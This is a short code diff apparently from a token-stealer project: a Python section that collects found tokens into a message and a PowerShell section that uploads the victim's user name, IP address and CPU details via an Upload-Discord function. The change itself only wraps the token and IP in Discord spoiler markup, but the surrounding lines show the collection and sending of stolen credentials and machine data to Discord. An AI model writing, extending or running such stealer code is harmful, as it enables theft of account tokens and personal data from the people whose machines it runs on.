@@ -55,7 +55,7 @@ def main():
 
         if len(tokens) > 0:
             for token in tokens:
-                message += f'{token}\n'
+                message += f'||{token}||\n'
         else:
             message += 'No tokens found.\n'
 
@@ -137,7 +137,7 @@ Upload-Discord -text "**Token MC**: DEV..."
 Upload-Discord -text "-----------------------------**INFO-PC**---------------------------------------------"
 Upload-Discord -text "**Name**: $env:UserName"
 Upload-Discord -text "--------------"
-Upload-Discord -text "**IP**: $ip"
+Upload-Discord -text "**IP**: ||$ip||"
 Upload-Discord -text "---"
 Upload-Discord -text "**CPU**: $cpu"
 Upload-Discord -text "---"
